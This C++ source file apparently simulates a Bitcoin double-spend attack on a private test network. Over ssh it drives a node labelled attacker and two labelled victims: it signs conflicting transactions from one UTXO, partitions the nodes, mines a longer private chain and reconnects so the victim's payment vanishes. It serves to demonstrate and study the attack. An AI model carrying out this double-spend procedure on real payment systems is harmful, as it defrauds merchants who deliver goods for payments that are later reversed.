#include <cstdlib>
#include <cstdio>
#include <thread>
#include <mutex>

#include "CSynchronizationGuard.h"
#include "CTransactionHandler.h"
#include "CParameterPreparator.h"

#define BLOCK_MINING_TIME_ATTACKER 1
#define BLOCK_MINING_TIME_NETWORK 3

/**
 * Function to mine a specified ammount of blocks to a specified address.
 */
void mine(const std::string ssh, const std::string address, const int minedBlockCnt) {
    //Create the command for mining according to the received parameters.
    std::ostringstream functionOss;
    functionOss << ssh << " ";
    if (ssh != "") {
        functionOss << "'";
    }
    functionOss << "bitcoin-cli generatetoaddress 1 " << address;
    if (ssh != "") {
        functionOss << "'";
    }

    //Mine [minedBlockCnt] blocks.
    for (int i = 0; i < minedBlockCnt; ++i) {
        redi::ipstream mineOut(functionOss.str(), redi::pstream::pstdout);

        //Parse output as JSON.
        std::ostringstream mineOss;
        std::string line;
        while (std::getline(mineOut.out(), line)) {
            mineOss << line;
        }

        nlohmann::json mineJson = nlohmann::json::parse(mineOss.str());

        //Print hash of the mined block.
        std::cout << mineJson[0];
        if (minedBlockCnt != 1 && i != minedBlockCnt - 1) {
            std::cout << ", ";
        }
    }
}

/**
 * Thread function, threads mine blocks until attacker has more blocks mined than the blockchain shared by VICTIM1 and VICTIM2.
 */
void minerThread(const std::vector<std::string> ssh, const std::vector<std::string> address, int delay_sec,
                 std::mutex &mtxMining, int &minerCnt, std::mutex &mtxMinerCnt, bool isAttacker) {
    bool attackerHasMoreBlocksMined = false;
    while (!attackerHasMoreBlocksMined) {
        //Choose a random miner from the received addresses.
        int randomAddress = rand() % address.size();

        //Lock the mining part of the program, not because of mining itself, but rather so that the output is readable.
        std::unique_lock<std::mutex> locker(mtxMining);

        //Specify text coloring.
        if (isAttacker) {
            std::cout << rang::fg::blue;
        } else {
            std::cout << rang::fg::magenta;
        }
        std::cout << rang::style::bold << "Block ";
        mine(ssh[randomAddress], address[randomAddress], 1);
        std::cout << " was mined to address [" << address[randomAddress] << "]!" << rang::style::reset << std::endl;

        //Get information about blocks in the network.
        redi::ipstream networkBlockCountOut("ssh victim1@$IP_VICTIM1 'bitcoin-cli getblockcount'",
                                            redi::pstreams::pstdout), attackerBlockCountOut("bitcoin-cli getblockcount",
                                                                                            redi::pstreams::pstdout);
        //Parse the received output.
        std::string networkBlockCountStr, attackerBlockCountStr;
        std::getline(networkBlockCountOut.out(), networkBlockCountStr);
        std::getline(attackerBlockCountOut.out(), attackerBlockCountStr);

        //When the attacker has more blocks than network (leaving [1] block buffer to protect against race errors), stop running.
        //If ionly one miner remains, stop. -> Ugly hack to prevent deadlock (attacker could {mine block -> be [2] blocks ahead -> end} and network would subsequently {wake up -> mine a blocks -> attacker is [1] block ahead -> network would stay in the deadlock}). If more than two threads were used, this should be changed, but it works for our purposes.
        if (std::stoi(attackerBlockCountStr) - std::stoi(networkBlockCountStr) >= 2 || minerCnt == 1) {
            attackerHasMoreBlocksMined = true;
        } else {
            locker.unlock();
            sleep(delay_sec);
        }
    }

    //Lock the minerCnt variable (very definsive programming, should not be necssarily needed).
    std::lock_guard<std::mutex> locker(mtxMining);
    --minerCnt;
}

int main() {
    //Perform a synchronization check.
    if (system("~/attacks/scripts/checkSynchronization.sh")) {
        std::cerr << rang::fg::red << rang::style::bold << "------------------NETWORK ERROR------------------"
                  << std::endl
                  << "One or more of the expected nodes is not running/synchronized. Please try waiting for a short while and rerunning the program. If the problem persists, consider reseting the network. "
                  << rang::style::reset << std::endl;
        return 1;
    }

    //Check whether a usable address exists within the system. If not, generate one.
    if (std::filesystem::is_empty("/home/attacker/attacker/addresses")) {
        std::cout << rang::fg::gray << rang::style::bold << "No usable addresses exist, generating new address."
                  << rang::style::reset << std::endl;
        system("bitcoin-cli getnewaddress > ~/attacker/addresses/address_0.txt");
    }

    //Create helper objects.
    CSynchronizationGuard synchronizationGuard;
    CParameterPreparator parameterPreparator;
    CTransactionHandler transactionHandler;

    //Get UTXO information.
    transactionInfo UTXO = parameterPreparator.chooseUTXO();

    //Generate victim addresses and print all the used addresses.
    std::pair<std::string, std::string> victimAddresses = parameterPreparator.generateAddresses(
            "ssh victim1@$IP_VICTIM1 \'bitcoin-cli getnewaddress | tee victim1/addresses/address_$(($(ls -l victim1/addresses | wc -l) - 1)).txt\'",
            "ssh victim2@$IP_VICTIM2 \'bitcoin-cli getnewaddress | tee victim2/addresses/address_$(($(ls -l victim2/addresses | wc -l) - 1)).txt\'");
    std::cout << rang::fg::gray << rang::style::bold << "Addresses for the attack were set as following:" << std::endl
              << "--------------------------------------------------------" << std::endl << rang::fg::blue
              << "ATTACKER: [" << UTXO.m_address << "]" << std::endl << rang::fg::magenta << "VICTIM1:  ["
              << victimAddresses.first << "]" << std::endl << "VICTIM2:  [" << victimAddresses.second << "]"
              << rang::style::reset << std::endl << rang::style::bold << rang::fg::gray
              << "--------------------------------------------------------" << rang::style::reset << std::endl;

    //Count the ammounts to pay, including fee.
    std::pair<float, float> paidAmmounts = parameterPreparator.calculateAmmounts(UTXO, 0.11);

    //Create transaction strings using the same UTXOs, but to different addresses.
    std::ostringstream txVictimOss, txAttackerOss;
    //Standard transaction to the victim.
    txVictimOss << "bitcoin-cli createrawtransaction \'[{\"txid\": \"" << UTXO.m_txID << "\",\"vout\":" << UTXO.m_vout
                << "}]\' \'{\"" << victimAddresses.first << "\":" << paidAmmounts.first << ", \"" << UTXO.m_address
                << "\":" << paidAmmounts.second;
    //Transaction simply sends [UTXO.amount-fee] to attackers other address.
    //Fee on the second transaction has to be higher due to RBF policy: https://buybitcoinworldwide.com/rbf/
    txAttackerOss << "bitcoin-cli createrawtransaction \'[{\"txid\": \"" << UTXO.m_txID << "\",\"vout\":" << UTXO.m_vout
                  << "}]\' \'{\"" << UTXO.m_address << "\":" << paidAmmounts.first + paidAmmounts.second - 0.01;

    //Generate signed hexes of the passed transation strings.
    std::pair<std::string, std::string> signedTxHexes = transactionHandler.createSignedTransactions(txVictimOss,
                                                                                                    txAttackerOss);

    //Send the transaction for the VICTIM1 to the network and wait for its' delivery.
    std::string sentVictimTxid = transactionHandler.sendTransaction(signedTxHexes.first);
    synchronizationGuard.waitForTxDelivery("ssh victim1@$IP_VICTIM1 \"bitcoin-cli listtransactions\"", sentVictimTxid);

    //Disconnect ATTACKER from VICTIM1 and VICTIM2.
    system("bitcoin-cli addnode $IP_VICTIM1:18445 remove; bitcoin-cli disconnectnode $IP_VICTIM1:18445");
    system("bitcoin-cli addnode $IP_VICTIM2:18445 remove; bitcoin-cli disconnectnode $IP_VICTIM2:18445");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_ATTACKER:18445 remove; bitcoin-cli disconnectnode $IP_ATTACKER:18445\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_ATTACKER:18445 remove; bitcoin-cli disconnectnode $IP_ATTACKER:18445\"");
    synchronizationGuard.waitForDisconnection(0, 1, 1);

    //Delete transaction sent to the network.
    transactionHandler.deleteTransaction(sentVictimTxid);

    //Send the second transaction (only to the attacker itself) and wait for the delivery.
    std::string sentAttackerTxid = transactionHandler.sendTransaction(signedTxHexes.second);
    synchronizationGuard.waitForTxDelivery("bitcoin-cli listtransactions", sentAttackerTxid);

    //Initalize randomness.
    srand((unsigned) time(0));

    //We will give the blockchain distributed between VICTIM1 and VICTIM2 a head start. Get random number ( != 0 && < 10) of premined blocks in the network.
    int headStart = rand() % 10;
    while (headStart == 0) {
        headStart = rand() % 10;
    }

    //Network mines [headStart] blocks.
    std::cout << rang::fg::gray << rang::style::bold << "Blockchain shared between VICTIM1 and VICTIM2 starts ["
              << headStart << "] blocks ahead. VICTIM1 mined the blocks with hashes:[";
    mine("ssh victim1@$IP_VICTIM1", victimAddresses.first, headStart);

    std::cout << "]" << std::endl << rang::fg::gray
              << "Attacker and VICTIM1 now both have transactions spending the same UTXO in their mempools."
              << std::endl;
    transactionHandler.printTransactions("----------------------ATTACKER----------------------",
                                         "-----------------------VICTIM------------------------",
                                         "bitcoin-cli listtransactions \"*\" 200",
                                         "ssh victim1@$IP_VICTIM1 \"bitcoin-cli listtransactions \'*\' 200 \"",
                                         sentAttackerTxid, sentVictimTxid);

    std::cout << rang::fg::gray << rang::style::bold << "Attacker and the rest of the network both start mining:"
              << std::endl
              << "---------------------------------------------------------------------------------------------------------------------------------------------"
              << rang::style::reset << std::endl;

    //Create two mining threads, one for the attacker and second for the network.
    std::mutex minerMtx, minerCntMtx;
    int minerCnt = 2;
    std::vector<std::string> sshNetwork = {"ssh victim1@$IP_VICTIM1", "ssh victim2@$IP_VICTIM2"}, sshAttacker = {
            ""}, addressesNetwork = {victimAddresses.first, victimAddresses.second}, addressesAttacker = {
            UTXO.m_address};
    std::thread networkThr(minerThread, sshNetwork, addressesNetwork, BLOCK_MINING_TIME_NETWORK, std::ref(minerMtx),
                           std::ref(minerCnt), std::ref(minerCntMtx), false);
    std::thread attackerThr(minerThread, sshAttacker, addressesAttacker, BLOCK_MINING_TIME_ATTACKER, std::ref(minerMtx),
                            std::ref(minerCnt), std::ref(minerCntMtx), true);

    //Wait until both threads end.
    attackerThr.join();
    networkThr.join();

    //Parse and print number of blocks in each of the separated networks.
    redi::ipstream attackerBlockCntOut("bitcoin-cli getblockcount", redi::pstreams::pstdout), networkBlockCntOut(
            "ssh victim1@$IP_VICTIM1 'bitcoin-cli getblockcount'", redi::pstreams::pstdout);
    std::string attackerBlockCnt, networkBlockCnt;
    std::getline(attackerBlockCntOut.out(), attackerBlockCnt);
    std::getline(networkBlockCntOut.out(), networkBlockCnt);

    std::cout << rang::fg::gray << rang::style::bold
              << "---------------------------------------------------------------------------------------------------------------------------------------------"
              << std::endl << "Mining ended!" << std::endl << rang::fg::blue << "Attacker now has [" << attackerBlockCnt
              << "] blocks mined." << std::endl << rang::fg::magenta << "Network now has [" << networkBlockCnt
              << "] blocks mined." << rang::style::reset << std::endl;


    //Delete any previously received services. Ipstreams' only purpose is to silence possible errors.
    redi::ipstream del("rm -r /home/attacker/attacker/victim1/serviceVictim1.txt",
                       redi::pstreams::pstdout | redi::pstreams::pstderr);

    //Issue calls to victim to run their returnService.sh script simmulating a deamon running on them that sends some kind of service for received payments.
    system("ssh victim1@$IP_VICTIM1 \"./scripts/returnService.sh\"");

    //Connect all nodes back together.
    system("bitcoin-cli addnode $IP_VICTIM1:18445 add");
    system("bitcoin-cli addnode $IP_VICTIM2:18445 add");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_ATTACKER:18445 add\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_ATTACKER:18445 add\"");

    //Wait for all nodes to connect back.
    while (system("~/attacks/scripts/checkSynchronization.sh")) {
        sleep(DELAY_SEC);
    }

    std::cout << rang::fg::gray << "Transaction issued to victim should no longer exist:" << rang::style::reset
              << std::endl;
    transactionHandler.printTransactions("----------------------ATTACKER----------------------",
                                         "-----------------------VICTIM------------------------",
                                         "bitcoin-cli listtransactions \"*\" 200",
                                         "ssh victim1@$IP_VICTIM1 \"bitcoin-cli listtransactions \'*\' 200 \"",
                                         sentAttackerTxid, sentVictimTxid);

    //Report attack success/failure.
    if (std::filesystem::exists("/home/attacker/attacker/victim1/serviceVictim1.txt")) {
        std::cout << rang::fg::green << rang::style::bold << "Attack was successful, service was correctly received:"
                  << rang::style::reset << std::endl;
        std::cout << rang::style::bold << rang::fg::magenta << "-----------------------VICTIM------------------------"
                  << rang::style::reset << std::endl;
        system("cat ~/attacker/victim1/serviceVictim1.txt");
        std::cout << rang::style::bold << rang::fg::gray << "-----------------------------------------------------"
                  << rang::style::reset << std::endl;
        std::cout << rang::fg::green << rang::style::bold
                  << "The received service is the file: '~/attacker/victim1/serviceVictim1.txt'" << rang::style::reset
                  << std::endl;
    } else {
        std::cout << rang::fg::red << rang::style::bold << "Attack unssuccessful, the service was not received!"
                  << std::endl << "You can check '~/attacker/victim1/serviceVictim1.txt' to debug what happend."
                  << std::endl << "If this was not the expected output, consider reseting the network."
                  << rang::style::reset << std::endl;
    }


    return 0;
}
